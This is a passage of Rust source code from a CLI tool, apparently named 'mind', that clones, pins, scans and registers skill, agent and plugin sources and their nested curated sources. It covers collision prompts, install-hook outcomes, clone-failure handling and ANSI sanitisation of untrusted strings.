        let target = clone_dir_checked(paths, &source)?;
        if target.exists() {
            std::fs::remove_dir_all(&target).map_err(|e| MindError::io(&target, e))?;
        }
        if let Some(parent) = target.parent() {
            crate::paths::mkdir_p(parent)?;
        }
        if let Err(e) = git::clone_at(&source.url, &target, &checkout_pin) {
            let _ = std::fs::remove_dir_all(&target);
            // spec: CLI-177, CLI-178, CLI-180 -- apply the same top-level clone
            // error handling (lead with stderr, auth/proxy hints, strip store path)
            // for the re-clone-at-pin step.
            let e = if top_level {
                let ssh = (!source.is_local()).then(|| source.ssh_url());
                handle_top_level_clone_err(e, ssh, &target, out)
            } else {
                e
            };
            return Err(e);
        }
        dir = target;
        // The pin may land on a different mind.toml than the working tree / default
        // branch. Reload it so downstream in-memory reads see the pinned content.
        mindfile = MindToml::load(&dir)?;
        // spec: DSC-94 -- B4: sanitize at every re-read of the pinned mind.toml too.
        source.description = mindfile
            .as_ref()
            .and_then(|m| m.source.description.clone())
            .map(|d| strip_ansi(&d));
    }

    // Resolve the recorded commit at the checkout point. A linked (no-pin) local
    // source records its working-tree HEAD (best-effort; a non-git local dir
    // simply records no commit). Everything else records the cloned commit. A
    // freeze always needs a concrete commit, so it never takes the best-effort path.
    let linked_default = is_local && checkout_pin == Pin::DefaultBranch && !freeze;
    let commit = if linked_default {
        git::head_commit(&source.url, &dir).ok()
    } else {
        Some(git::head_commit(&source.url, &dir)?)
    };

    // Step 4: a freeze persists the resolved commit as an immutable ref (CLI-200).
    // When the frozen point is a *local* source's default branch, Step 3 did not
    // clone (the working tree was read live), so snapshot it into the sources tree
    // now -- a ref-pinned local source is a clone, never a live working tree (CLI-27).
    let final_pin = if freeze {
        let sha = commit.clone().expect("a freeze reads a concrete commit");
        let ref_pin = Pin::Ref(sha);
        if is_local && checkout_pin == Pin::DefaultBranch {
            source.pin = ref_pin.clone();
            let target = clone_dir_checked(paths, &source)?;
            if target.exists() {
                std::fs::remove_dir_all(&target).map_err(|e| MindError::io(&target, e))?;
            }
            if let Some(parent) = target.parent() {
                crate::paths::mkdir_p(parent)?;
            }
            // spec: CLI-18 -- a failed snapshot must leave nothing behind, same as
            // the Step-3 clone. The source (local) is not a network remote, so the
            // top-level stderr/auth handling does not apply here.
            if let Err(e) = git::clone_at(&source.url, &target, &ref_pin) {
                let _ = std::fs::remove_dir_all(&target);
                return Err(e);
            }
            dir = target;
            mindfile = MindToml::load(&dir)?;
            // spec: DSC-94 -- B4: sanitize at the freeze-snapshot re-read too.
            source.description = mindfile
                .as_ref()
                .and_then(|m| m.source.description.clone())
                .map(|d| strip_ansi(&d));
        }
        ref_pin
    } else {
        checkout_pin
    };

    source.pin = final_pin;
    source.commit = commit;

    // Persist the consumer's --root override (STO-17, DSC-51).
    // DSC-52: if --root is given for an authoritative source, print a note.
    let is_authoritative = mindfile.as_ref().is_some_and(|m| m.is_authoritative());

    // MKT-2/MKT-15: when an own-item source-discovery directive is in effect, the
    // plugin-manifest's own-item layer is suppressed. Emit an advisory note so the
    // user is not surprised to find the manifest ignored. Both plugin.json and
    // marketplace.json trigger the note; catalog.rs stays quiet and leaves
    // reporting here. Three distinct cases:
    //   - authoritative `[[items]]`/`[discover]` globs (MKT-2): the manifest is
    //     wholly ignored (its external curator entries are not walked either).
    //   - a mind.toml `[source].roots`/`flat-skills` scan layout (MKT-15): only the
    //     manifest's own-item layer is ignored; convention discovery supplies the
    //     repo's items and any marketplace external entries still compose.
    //   - a consumer `--root`/`--flat-skills` override (MKT-15, DSC-51/DSC-75):
    //     same as the scan-layout case, so the flag is not a silent no-op on a
    //     manifest source.
    // A bare `[discover].sources` list is NOT an own-item directive and prints no
    // note: the manifest still defines the immediate source (MKT-16).
    let declares_scan_layout = mindfile.as_ref().is_some_and(|m| m.declares_scan_layout());
    let consumer_scan_layout = !roots.is_empty() || flat_skills;
    if !out.json && (is_authoritative || declares_scan_layout || consumer_scan_layout) {
        let has_plugin = plugin_manifest::find_plugin_manifest(&dir).is_some();
        let has_marketplace = plugin_manifest::find_marketplace_manifest(&dir).is_some();
        if has_plugin || has_marketplace {
            if is_authoritative {
                println!(
                    "note: {} uses an authoritative mind.toml; its .claude-plugin/ manifest is ignored",
                    source.name
                );
            } else {
                // spec: MKT-15 — the manifest's own-item layer is suppressed; name
                // where the convention layout came from (consumer flag vs mind.toml).
                let via = if declares_scan_layout {
                    "mind.toml [source].roots/flat-skills"
                } else {
                    "--root/--flat-skills"
                };
                println!(
                    "note: {} discovers its own items by convention ({via}); \
                     the .claude-plugin/ manifest's plugin components are ignored",
                    source.name
                );
            }
        }
    }

    if !roots.is_empty() {
        if is_authoritative {
            // spec: DSC-52
            if !out.json {
                println!(
                    "note: {} uses an authoritative mind.toml; --root is ignored",
                    source.name
                );
            }
        } else {
            source.roots = Some(roots);
        }
    } else if apply_curated && curated.roots.is_some() {
        // DSC-61: with no consumer --root override, curator-supplied roots govern
        // convention discovery just like a source's own [source].roots (DSC-50).
        // A gated source has no mind.toml, so it cannot be authoritative.
        source.roots = curated.roots.clone();
    }

    // Persist the consumer's --flat-skills override (STO-44, DSC-75), mirroring
    // the --root handling above.
    // DSC-76: if --flat-skills is given for an authoritative source, print a note
    // (it affects convention discovery only).
    if flat_skills {
        if is_authoritative {
            // spec: DSC-76
            if !out.json {
                println!(
                    "note: {} uses an authoritative mind.toml; --flat-skills is ignored",
                    source.name
                );
            }
        } else {
            source.flat_skills = true;
        }
    } else if apply_curated && curated.flat_skills {
        // spec: DSC-77 / DSC-60 — with no consumer override, curator-supplied
        // flat-skills governs convention discovery, applied only because the gated
        // source has no mind.toml of its own (so it cannot be authoritative).
        source.flat_skills = true;
    }

    // spec: DSC-84 / STO-55 -- persist the consumer's --add-root roots. They
    // compose with whatever layer is authoritative (manifest, authoritative
    // mind.toml, or convention), so unlike --root there is no ignored/suppressed
    // note to print for a direct consumer `--add-root`. Root validation happens
    // in the scan (InvalidRoot).
    if !add_roots.is_empty() {
        source.add_roots = Some(add_roots);
    } else if apply_curated && curated.add_roots.is_some() {
        // spec: DSC-88 -- unlike a direct consumer `--add-root`, a CURATOR's
        // `add-roots` (from a `[discover].sources` entry) is gated by DSC-60
        // exactly like `roots`/`flat-skills`/hooks: it composes only when the
        // nested source has no `mind.toml` of its own. Without this gate a
        // curator could reach into a nested source's authoritative export list
        // (DSC-3) and surface everything it deliberately did not export.
        source.add_roots = curated.add_roots.clone();
    }

    // Scan before registering. If the source is rejected here (e.g. the
    // version gate, DSC-40), remove the clone so no orphan is left on disk.
    // Use `!source.is_linked()` (not `!is_local`) so that a pinned-local clone
    // (which is NOT a linked working tree) is also cleaned up on failure (CLI-18,
    // CLI-27).
    let mut items = match catalog::scan(paths, &single(&source)) {
        Ok(items) => items,
        Err(e) => {
            if !source.is_linked() {
                let _ = std::fs::remove_dir_all(&dir);
            }
            return Err(e);
        }
    };

    // CLI-24: a source that declares `[source].prefix` and was not melded with an
    // explicit `--as` prefix prompts (interactively) whether to namespace its
    // items under that prefix. The items were scanned with no alias, so their
    // effective names already reflect the declared prefix; show them so the choice
    // is concrete (the names the items will install as). The choice becomes the
    // source alias; if it differs from the declared prefix, re-scan so the recorded
    // names, the warning, and the count match. Non-interactive runs accept the
    // declared prefix as-is (alias stays None).
    if top_level
        && source.alias.is_none()
        && crate::hook::is_tty()
        && let Some(declared) = mindfile.as_ref().and_then(|m| m.source.prefix.clone())
        && !declared.is_empty()
    {
        let preview = if items.is_empty() {
            String::new()
        } else {
            // spec: DSC-95 -- sanitize each name before joining (not the
            // composed preview afterward): an unterminated escape in one name
            // would otherwise consume the rest of the joined list.
            let names: Vec<String> = items.iter().map(|it| it.display_key()).collect();
            format!("\n  items would install as: {}", names.join(", "))
        };
        let answer = prompt_line(&format!(
            "{} suggests the prefix '{declared}'.{preview}\n  use it? [Y]es / type a different prefix / [n]o prefix: ",
            source.name
        ))?;
        let chosen = crate::namespace::prefix_choice(&answer);
        // NS-25: a custom prefix typed at the prompt is held to the same rule.
        if let Some(c) = &chosen {
            crate::namespace::validate_prefix(c)?;
        }
        if chosen != source.alias {
            source.alias = chosen;
            items = match catalog::scan(paths, &single(&source)) {
                Ok(items) => items,
                Err(e) => {
                    if !source.is_linked() {
                        let _ = std::fs::remove_dir_all(&dir);
                    }
                    return Err(e);
                }
            };
        }
    }

    // NS-43: Cross-source skill/rule/tool collision check. Only runs for a
    // top-level `meld` (not for curated nested sources which the caller controls).
    if top_level {
        let manifest = crate::manifest::Manifest::load(paths)?;
        let mut conflicts: Vec<(String, String, String)> = Vec::new();
        for entry in manifest.items.values() {
            // Agents are handled separately by NS-41.
            if entry.kind == crate::error::ItemKind::Agent {
                continue;
            }
            // Skip items from the same source (re-meld / upgrade).
            if entry.source == source.name {
                continue;
            }
            // Collision: same (kind, effective_name) pair from a different source.
            let eff_name = entry.name.as_str();
            if items
                .iter()
                .any(|it| it.kind == entry.kind && it.effective_name() == eff_name)
            {
                conflicts.push((
                    entry.kind.as_str().to_string(),
                    eff_name.to_string(),
                    entry.source.clone(),
                ));
            }
        }
        if !conflicts.is_empty() {
            let suggested = suggested_namespace(&source.url);
            // spec: NS-44 NS-45 — interactive only on a real TTY AND without --yes.
            if crate::hook::is_tty() && !yes {
                // NS-44: interactive TTY path — prompt for a namespace prefix.
                // spec: NS-44
                let answer = prompt_line(&format!(
                    "name collision detected -- the following items conflict with \
                     already-installed items:\n{}\n\
                     enter a namespace prefix [{suggested}] (. to abort): ",
                    format_conflicts_display(&conflicts),
                ))?;
                // spec: NS-44 — parse the collision answer:
                //   empty  → accept the suggested prefix
                //   "."    → abort (SkillCollision, same as non-interactive)
                //   other  → use as custom prefix
                match parse_collision_answer(&answer, &suggested) {
                    CollisionAnswer::Abort => {
                        if !source.is_linked() {
                            let _ = std::fs::remove_dir_all(&dir);
                        }
                        return Err(MindError::SkillCollision {
                            conflicts,
                            suggested,
                        });
                    }
                    CollisionAnswer::Prefix(chosen_str) => {
                        let chosen = if chosen_str.is_empty() {
                            None
                        } else {
                            Some(chosen_str)
                        };
                        if let Some(c) = &chosen {
                            crate::namespace::validate_prefix(c)?;
                        }
                        if chosen != source.alias {
                            source.alias = chosen;
                            items = match catalog::scan(paths, &single(&source)) {
                                Ok(items) => items,
                                Err(e) => {
                                    if !source.is_linked() {
                                        let _ = std::fs::remove_dir_all(&dir);
                                    }
                                    return Err(e);
                                }
                            };
                        }
                    }
                }
            } else {
                // spec: NS-43 NS-45 — non-interactive (no TTY or --yes): hard error.
                if !source.is_linked() {
                    let _ = std::fs::remove_dir_all(&dir);
                }
                return Err(MindError::SkillCollision {
                    conflicts,
                    suggested,
                });
            }
        }
    }

    warn_unguarded_references(&items);
    warn_agent_collisions(paths, &items); // spec: NS-41 advisory
    if !out.json {
        // spec: CLI-205 -- a top-level meld that discovers zero items by
        // convention scanning gets a non-success glyph plus explicit guidance
        // (the convention paths and the escapes), rather than a "0 item(s))"
        // line that reads identically to a legitimate empty source. Suppressed
        // for a nested/curated meld (noise the caller doesn't control), an
        // authoritative mind.toml (roots/--add-root/--flat-skills don't apply
        // there, DSC-52/76), a pure super-source that only curates other
        // sources (zero own items is expected), and a plugin/marketplace
        // manifest source (which has its own guidance path above).
        let curates_other_sources = mindfile
            .as_ref()
            .and_then(|m| m.discover.as_ref())
            .is_some_and(|d| !d.sources.is_empty());
        let has_manifest = plugin_manifest::find_plugin_manifest(&dir).is_some()
            || plugin_manifest::find_marketplace_manifest(&dir).is_some();
        if items.is_empty()
            && top_level
            && !is_authoritative
            && !curates_other_sources
            && !has_manifest
        {
            println!("{} melded {} (0 item(s))", out.warn(), source.name);
            println!(
                "  no items found by convention scanning \
                 (skills/<name>/SKILL.md, agents/<name>.md, rules/<name>.md, \
                 commands/<name>.md, \
                 tools/<name>/); if your layout differs, use --root <dir>, \
                 --add-root <dir>, or --flat-skills"
            );
        } else {
            println!(
                "{} melded {} ({} item(s))",
                out.ok(),
                source.name,
                items.len()
            );
        }
        // spec: STO-60 -- when this meld forks a NEW aliased instance (STO-58) of
        // a repo that already has one or more melded instances, say so plainly:
        // the trailing `@<alias>` is otherwise the sole signal that a coexisting
        // instance (a second clone) was registered rather than an existing
        // source's prefix being changed. The registry does not yet contain this
        // source (pushed below), so a prior entry sharing the base identity means
        // a genuine fork.
        if source.as_alias.as_deref().is_some_and(|a| !a.is_empty()) {
            let base = source.base_identity();
            // spec: STO-63 -- name the actual registered instance(s) sharing this
            // base identity, not the bare base itself: when every pre-existing
            // instance is aliased, the bare `host/owner/repo` never appears in the
            // registry and is not a name `unmeld` (or anything else) can resolve.
            let existing: Vec<&str> = registry
                .sources
                .iter()
                .filter(|s| s.base_identity() == base)
                .map(|s| s.name.as_str())
                .collect();
            if !existing.is_empty() {
                let (subject, verb) = if existing.len() == 1 {
                    (format!("the existing {}", existing[0]), "remains")
                } else {
                    (
                        format!("the existing instances {}", existing.join(", ")),
                        "remain",
                    )
                };
                println!(
                    "note: registered a new instance {}; {subject} {verb}",
                    source.name
                );
            }
        }
    }

    // MKT-4: for a single-plugin source, report any unsupported component kinds
    // (hooks, mcp servers, etc.) that were silently dropped. This is advisory and
    // never a silent drop: the user sees a count so they are not misled into
    // thinking the plugin is fully represented. Only for plugin.json sources
    // (not marketplace catalogs, not convention-discovered sources).
    if !is_authoritative && !out.json && plugin_manifest::find_plugin_manifest(&dir).is_some() {
        let skipped_comps = catalog::plugin_skipped_components(&dir);
        if let Some(summary) = skipped_comps.summary() {
            println!("note: {summary}");
        }
    }

    // Install hooks (HOOK-50..60): the working tree is now checked out at the
    // resolved pin, so hooks run in the right tree. A fresh meld runs every
    // (as-yet-unrun) install hook.
    match run_install_hooks(
        &mut source,
        &dir,
        &mindfile,
        &toml_path,
        install_hook.as_deref(),
        dangerously_skip_hook_check,
        false,
        // DSC-61: curator-supplied hooks (when applied) run through the same
        // disclosure/safety-prompt/non-TTY-skip path as a source's own hooks.
        curated_hooks,
    ) {
        Ok(HookOutcome::Proceed) => {}
        Ok(HookOutcome::Abort) => {
            // HOOK-21: aborting installs nothing; the source is not registered.
            // Use `!source.is_linked()` so a pinned-local clone is removed on
            // abort, while a linked working tree is never touched (CLI-27).
            if !source.is_linked() {
                let _ = std::fs::remove_dir_all(&dir);
            }
            println!("aborted; nothing installed");
            return Ok(0);
        }
        Err(e) => {
            // HOOK-30/HOOK-53: a hook failure fails the meld; remove the clone.
            // Same guard: remove a pinned-local clone but not the working tree.
            if !source.is_linked() {
                let _ = std::fs::remove_dir_all(&dir);
            }
            return Err(e);
        }
    }

    // MKT-6/MKT-10: record plugin/marketplace provenance and metadata when the
    // source came from a Claude plugin manifest (not suppressed by an authoritative
    // mind.toml). The description from plugin.json fills in only when mind.toml
    // [source].description has not already set it (DSC-32 precedence). Strings
    // from the manifest are passed through strip_ansi to prevent terminal injection
    // (MKT-9/DSC-69).
    // An item-link instance bypasses any plugin manifest (LNK-7), so it never
    // records a manifest origin.
    if !is_authoritative && source.item_path.is_none() {
        if let Some(plugin_path) = plugin_manifest::find_plugin_manifest(&dir) {
            source.origin = Some(ManifestOrigin::ClaudePlugin);
            if let Ok(pm) = plugin_manifest::load_plugin_manifest(&plugin_path) {
                source.plugin_version = pm.version;
                if source.description.is_none() {
                    source.description = pm.description.map(|d| strip_ansi(&d));
                }
            }
        } else if plugin_manifest::find_marketplace_manifest(&dir).is_some() {
            // The marketplace-level origin; per-entry origins are set below (Section C)
            // after each sub-source is recursively melded.
            source.origin = Some(ManifestOrigin::ClaudeMarketplace);
        }
    }

    // Capture the super-source name before moving `source` into the registry,
    // so DSC-63 error messages can reference it.
    let super_source_name = source.name.clone();
    // spec: LNK-8 -- an item-link instance registers no nested sources: the
    // [discover].sources and marketplace-external walks below are skipped.
    let is_link = source.item_path.is_some();
    registry.sources.push(source);

    let mut added = 1;
    // DSC-80: count nested entries that failed to register for a non-auth reason,
    // so the curator-empty guard below can distinguish "curator with all nested
    // sources gone" from an ordinary curator that simply has nothing nested.
    let mut nested_clone_failures = 0usize;
    if let Some(nested) = mindfile
        .as_ref()
        .filter(|_| !is_link) // spec: LNK-8
        .and_then(|m| m.discover.as_ref())
        .map(|d| &d.sources)
    {
        for entry in nested {
            // DSC-64: install = true and a non-empty install-items list are
            // mutually exclusive; error before we register anything.
            entry.validate(&toml_path)?;

            // spec: DSC-93 -- the absolute entry wins. DSC-92 resolves a
            // relative local `source` against the directory the `mind.toml` was
            // read from; for a CLONED curator that directory sits inside mind's
            // own managed sources tree, so `../nested` names a sibling clone dir
            // mind never created. Attempting it is a guaranteed clone failure,
            // and for a curator with no items of its own DSC-80 escalates that
            // into a hard error that aborts the whole meld -- even when the
            // caller (a `dump` reproduction, say) ALSO carries a correct
            // absolute entry for that very source, which the walk simply had not
            // reached yet. Skip it with a warning so the absolute reading gets
            // its turn. A LINKED curator is unaffected: its `mind.toml` is read
            // from the user's own working tree, so its relative entries never
            // resolve into the sources tree, and a genuine typo there still
            // fails exactly as before (DSC-79/DSC-80).
            if let Some(missing) = unresolvable_managed_local_entry(paths, &entry.source) {
                eprintln!(
                    "warning: skipping nested source '{}' curated by '{super_source_name}': it \
                     resolves inside mind's own sources tree ({}) where nothing was cloned, so \
                     it is a relative path that only meant something in the curator's own \
                     working tree; meld that source by an absolute path or a URL instead",
                    missing.display(),
                    paths.sources_dir().display()
                );
                skipped.push(SkippedEntry {
                    source: entry.source.clone(),
                    reason: "unresolvable_local_path".into(),
                });
                continue;
            }

            // DSC-59 DSC-65: lift this entry's curator-supplied configuration.
            // The pin directive is authoritative (DSC-65). Hooks and roots are
            // gated (DSC-60). All are resolved here against the super-source's
            // mind.toml path; the gate lives in the recursive call.
            // spec: DSC-100 -- an item-link entry's declared kind. Parsed here
            // (a bad word is a MindToml error naming the entry) and threaded
            // through as the instance's explicit kind, NOT through
            // `CuratedConfig`: that carries the DSC-60-gated configuration,
            // while a link's kind is what makes the entry installable at all.
            let entry_kind = entry.item_kind(&toml_path)?;
            let curated = curated_config_for(entry, &toml_path)?;
            // Nested sources from a curated super-source get no consumer pin or
            // root override; the curator config (when applied) supplies them.
            match meld_recursive(
                paths,
                registry,
                &entry.source,
                entry.effective_alias(), // spec: DSC-78 — prefer `namespace`, fall back to `as`
                vec![],                  // no consumer roots for nested sources
                vec![], // spec: DSC-88 -- no consumer add-root; curator's add-roots is gated above
                false,  // no consumer --flat-skills for nested sources (curator config supplies it)
                PinRequest::None, // no consumer pin for nested sources
                false,
                visited,
                policy,
                None, // no consumer install hook for nested sources
                dangerously_skip_hook_check,
                prefer_ssh, // nested sources inherit the SSH preference
                false,      // nested sources inherit non-interactive mode but not --yes
                Some(curated),
                skipped,
                // spec: DSC-100 -- the entry's own `kind =`, for an item-link entry.
                entry_kind,
                // spec: STO-82 -- provenance for `curate` (CUR-7).
                Some(super_source_name.clone()),
            ) {
                Ok(n) => added += n,
                // DSC-68/DSC-69: an auth failure is governed by on-auth-failure
                // when present; without it, it stays a generic git error.
                Err(e) if git::is_auth_failure(&e) => {
                    // spec: STO-58 -- the nested source registers under its
                    // effective alias, so resolve its identity with that alias to
                    // match the DSC-70 "already registered" guard correctly.
                    // spec: CLI-216 -- quiet: the clone this entry names has
                    // already been attempted and failed; re-deriving its name is
                    // answering a question, not deciding a reading.
                    let entry_name = parse_spec_quiet(&entry.source)
                        .map(|mut s| {
                            s.apply_alias(entry.effective_alias());
                            s.name
                        })
                        .unwrap_or_else(|_| entry.source.clone());
                    // spec: DSC-70 -- on-auth-failure only covers the entry's own
                    // clone failure. If the entry is already in the registry, it
                    // cloned successfully and the failure came from a descendant;
                    // propagate it unchanged so it is not misattributed to this entry.
                    if registry.find(&entry_name).is_some() {
                        return Err(e);
                    }
                    let Some(cfg) = &entry.on_auth_failure else {
                        return Err(e);
                    };
                    // spec: DSC-69 -- always warn to stderr regardless of --json mode;
                    // --json controls the outer result format, not warning visibility.
                    for line in auth_failure_lines(&entry_name, cfg) {
                        eprintln!("{line}");
                    }
                    if cfg.action == AuthFailureAction::Skip {
                        skipped.push(SkippedEntry {
                            source: entry_name,
                            reason: "auth_failure".into(),
                        });
                        // The source is not registered; its transitive chain is
                        // unreachable and therefore also skipped.
                        continue;
                    }
                    return Err(e);
                }
                // spec: DSC-79 -- a non-auth clone failure (network error,
                // not-found, etc.) of a nested entry is skipped with a warning
                // rather than hard-failing the whole meld.
                Err(e) => {
                    // spec: STO-58 -- the nested source registers under its
                    // effective alias, so resolve its identity with that alias to
                    // match the DSC-70 "already registered" guard correctly.
                    // spec: CLI-216 -- quiet, same as the auth-failure arm above.
                    let entry_name = parse_spec_quiet(&entry.source)
                        .map(|mut s| {
                            s.apply_alias(entry.effective_alias());
                            s.name
                        })
                        .unwrap_or_else(|_| entry.source.clone());
                    // spec: DSC-79/DSC-70 -- if the entry is already registered it
                    // cloned fine and the error came from a descendant; propagate
                    // it unchanged rather than misattributing it to this entry.
                    // The primary's own clone failure exits before this loop is
                    // reached (parse/clone of the primary happens in the top-level
                    // meld_recursive call), so this arm only sees nested failures.
                    if registry.find(&entry_name).is_some() {
                        return Err(e);
                    }
                    for line in clone_failure_lines(&entry_name, &e) {
                        eprintln!("{line}");
                    }
                    skipped.push(SkippedEntry {
                        source: entry_name,
                        reason: "clone_failure".into(),
                    });
                    nested_clone_failures += 1;
                    continue;
                }
            }

            // DSC-63: validate each install_items ref against the nested source's
            // offered bare names. A ref that names a non-existent item is an error
            // at meld, not a silent skip.
            if let Some(refs) = &entry.install_items
                && !refs.is_empty()
                // spec: CLI-216 -- an identity lookup for the DSC-63 validation,
                // not a decision to clone: quiet.
                && let Ok(mut spec) = parse_spec_quiet(&entry.source)
                // spec: STO-58 -- the nested source is registered under its
                // effective alias; resolve against that identity to find it.
                && {
                    spec.apply_alias(entry.effective_alias());
                    true
                }
                && let Some(nested_src) = registry.find(&spec.name)
            {
                let nested_items = catalog::scan(paths, &single(nested_src))?;
                for item_ref in refs {
                    // Each ref must be a bare kind:name (DSC-63).
                    let parsed = crate::resolve::parse_item_ref(item_ref).map_err(|_| {
                        MindError::BadReference {
                            item: format!("install-items in '{super_source_name}'"),
                            referent: item_ref.clone(),
                            reason: crate::error::BadRefReason::NoMatch,
                            in_source: spec.name.clone(),
                        }
                    })?;
                    // The ref must name an item the nested source offers
                    // (by bare name, not effective/prefixed name).
                    let found = nested_items.iter().any(|it| {
                        parsed.kind.is_none_or(|k| it.kind == k) && it.name == parsed.name
                    });
                    if !found {
                        return Err(MindError::BadReference {
                            item: format!("install-items in '{super_source_name}'"),
                            referent: item_ref.clone(),
                            reason: crate::error::BadRefReason::NoMatch,
                            in_source: spec.name.clone(),
                        });
                    }
                }
            }
        }
    }

    // MKT-7/MKT-8: marketplace catalog as a curated super-source. When the
    // melded source has a .claude-plugin/marketplace.json (and no authoritative
    // mind.toml), iterate its entries and meld each as a sub-source, reusing the
    // same [discover].sources machinery. This is an additive pass that runs after
    // the mind.toml nested-source loop above.
    if !is_authoritative
        && !is_link // spec: LNK-8
        && let Some(marketplace_path) = plugin_manifest::find_marketplace_manifest(&dir)
    {
        let manifest = plugin_manifest::load_marketplace_manifest(&marketplace_path)?;
        for entry in manifest.into_entries() {
            // MKT-14: in-repo plugins are catalog items of the parent source
            // (handled by catalog::scan_source_at); only external entries
            // need a recursive sub-meld here.
            if matches!(entry.source, plugin_manifest::PluginSource::InRepo { .. }) {
                continue; // spec: MKT-14
            }
            // belt-and-suspenders: into_entries() already validates
            // in-repo paths, so this is a redundant safety check.
            if let plugin_manifest::PluginSource::InRepo { ref path } = entry.source
                && !plugin_manifest::is_safe_manifest_path(path)
            {
                return Err(MindError::MindToml {
                    path: marketplace_path.clone(),
                    msg: format!("marketplace.json: in-repo plugin path {:?} is unsafe", path),
                });
            }
            let repo_spec = marketplace_entry_spec(&entry, &dir);
            let entry_name = entry.name.clone();
            let entry_version = entry.version;
            let entry_description = entry.description;
            // Recurse exactly like [discover].sources: cycle-safe
            // via visited, no consumer pin or roots, no install hook.
            match meld_recursive(
                paths,
                registry,
                &repo_spec,
                Some(entry_name.clone()),
                vec![],
                vec![],
                false,
                PinRequest::None, // no consumer pin
                false,            // nested, not top-level
                visited,
                policy,
                None, // no install hook override
                dangerously_skip_hook_check,
                prefer_ssh,
                false, // marketplace nested sources inherit non-interactive
                None,  // no curator config
                skipped,
                None, // a marketplace entry is a repo, never an item link
                // spec: STO-82 -- a marketplace catalog curates too (MKT-7).
                Some(super_source_name.clone()),
            ) {
                Ok(n) => {
                    added += n;
                    // MKT-8: marketplace entry fields are authoritative
                    // over the sub-source's own plugin.json. After the
                    // recursive meld, find the just-registered sub-source
                    // by its computed name and overwrite any fields the
                    // entry supplies (entry wins when both supply a value).
                    // spec: CLI-216 -- the sub-meld above already took its
                    // reading; this only re-derives the name to find it.
                    if let Ok(mut sub_spec) = parse_spec_quiet(&repo_spec)
                        && {
                            // spec: STO-58 -- the sub-source was melded under the
                            // entry name as its alias, so its identity is `@<name>`.
                            sub_spec.apply_alias(Some(entry_name.clone()));
                            true
                        }
                        && let Some(sub) = registry
                            .sources
                            .iter_mut()
                            .find(|s| s.name == sub_spec.name)
                    {
                        // Always tag as ClaudeMarketplace regardless of
                        // what the sub-source's own plugin.json says.
                        sub.origin = Some(ManifestOrigin::ClaudeMarketplace);
                        if entry_version.is_some() {
                            sub.plugin_version = entry_version;
                        }
                        if entry_description.is_some() {
                            sub.description = entry_description.map(|d| strip_ansi(&d));
                        }
                    }
                }
                Err(e) if git::is_auth_failure(&e) => {
                    // No on_auth_failure is defined for marketplace
                    // entries (no curator config); an auth failure
                    // propagates as a generic error.
                    return Err(e);
                }
                // spec: DSC-79 -- a non-auth clone failure of a marketplace
                // sub-source is skipped with a warning, mirroring the
                // [discover].sources loop above.
                Err(e) => {
                    // spec: STO-58 -- the sub-source registers under the entry
                    // name as its alias, so resolve its identity with that alias.
                    // spec: CLI-216 -- quiet: naming a clone that already failed.
                    let sub_name = parse_spec_quiet(&repo_spec)
                        .map(|mut s| {
                            s.apply_alias(Some(entry_name.clone()));
                            s.name
                        })
                        .unwrap_or_else(|_| entry_name.clone());
                    // spec: DSC-79/DSC-70 -- a failure after the sub-source is
                    // already registered originates from a descendant; propagate.
                    if registry.find(&sub_name).is_some() {
                        return Err(e);
                    }
                    for line in clone_failure_lines(&sub_name, &e) {
                        eprintln!("{line}");
                    }
                    skipped.push(SkippedEntry {
                        source: sub_name,
                        reason: "clone_failure".into(),
                    });
                    nested_clone_failures += 1;
                    continue;
                }
            }
        }
    }

    // spec: DSC-80 -- when the primary source is exclusively a curator (a catalog
    // scan of its own directory yields zero items) and every nested source failed
    // to register, registering a source with no discoverable items is not useful;
    // hard-fail. Only relevant when at least one nested source failed to clone; a
    // primary with its own items, or with any nested source that registered
    // (added > 1), succeeds. The primary/top-level source's own clone failure is a
    // separate hard error handled before the nested loop.
    if nested_clone_failures > 0
        && added == 1
        && let Some(primary) = registry.find(&super_source_name)
        // spec: CLI-213 -- a single-source lookup, so it must not degrade: a
        // `LinkedSourceGone` primary would scan as empty here and be reported as
        // "every nested source failed and the curator has nothing of its own",
        // which names the wrong cause.
        && scan_one(paths, primary)?.is_empty()
    {
        return Err(MindError::CuratorAllNestedFailed {
            super_source: super_source_name.to_string(),
        });
    }

    Ok(added)
}

// spec: DSC-69/CLI-224 -- `strip_ansi` used to be a private copy here, out of
// step with the shared, hardened `crate::sanitize::strip_ansi` (it also
// blocks Unicode directional marks and zero-width characters, and collapses a
// control-character run to one space instead of deleting it outright). Both
// copies applied to the exact same class of untrusted, source/curator-derived
// strings (plugin/marketplace descriptions, collision-prompt identities, auth-
// failure messages, git stderr), so the divergence meant only half of those
// call sites got the newer hardening. Now a plain re-export: every call site
// below routes through the one shared, hardened implementation.
use crate::sanitize::{display_path, strip_ansi};

/// Return the path of the managed policy file currently in effect, if any.
///
/// Mirrors the POL-1/POL-2 precedence of `Policy::load()`: the system path when
/// it exists, else `$MIND_POLICY_FILE` when set and the file exists. Used to
/// name the policy file in `SourceNotAllowed` output (POL-37) without requiring
/// the `Policy` struct to carry a path field.
fn effective_policy_path() -> Option<String> {
    #[cfg(target_os = "macos")]
    const SYSTEM_FIXED: &str = "/Library/Application Support/mind/policy.toml";
    #[cfg(all(not(target_os = "macos"), not(target_os = "windows")))]
    const SYSTEM_FIXED: &str = "/etc/mind/policy.toml";

    #[cfg(not(target_os = "windows"))]
    {
        let sys = std::path::Path::new(SYSTEM_FIXED);
        if sys.exists() {
            return Some(SYSTEM_FIXED.to_string());
        }
    }
    #[cfg(target_os = "windows")]
    {
        let base = std::env::var_os("PROGRAMDATA")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|| std::path::PathBuf::from(r"C:\ProgramData"));
        let sys = base.join("mind").join("policy.toml");
        if sys.exists() {
            return Some(sys.display().to_string());
        }
    }
    // Fall back to $MIND_POLICY_FILE when set and the file exists (POL-2).
    let env_path = std::env::var_os("MIND_POLICY_FILE").map(std::path::PathBuf::from)?;
    env_path.exists().then(|| env_path.display().to_string())
}

/// Derive a suggested namespace prefix from a source URL or local path.
///
/// Takes the last `/`-separated component and strips any `.git` suffix, so
/// `"https://github.com/foo/bar"` → `"bar"` and `"local/x/y"` → `"y"`.
fn suggested_namespace(url: &str) -> String {
    let base = url.split('/').next_back().unwrap_or(url);
    base.strip_suffix(".git").unwrap_or(base).to_string()
}

/// Format a conflict list for the interactive collision prompt (NS-44).
///
/// Each tuple is `(kind, effective_name, existing_source)`. Produces the same
/// bullet style as the `SkillCollision` error for consistency. Item name and
/// source name are stripped of ANSI escapes so a malicious source cannot inject
/// terminal control sequences into the prompt (spec: NS-44).
fn format_conflicts_display(conflicts: &[(String, String, String)]) -> String {
    conflicts
        .iter()
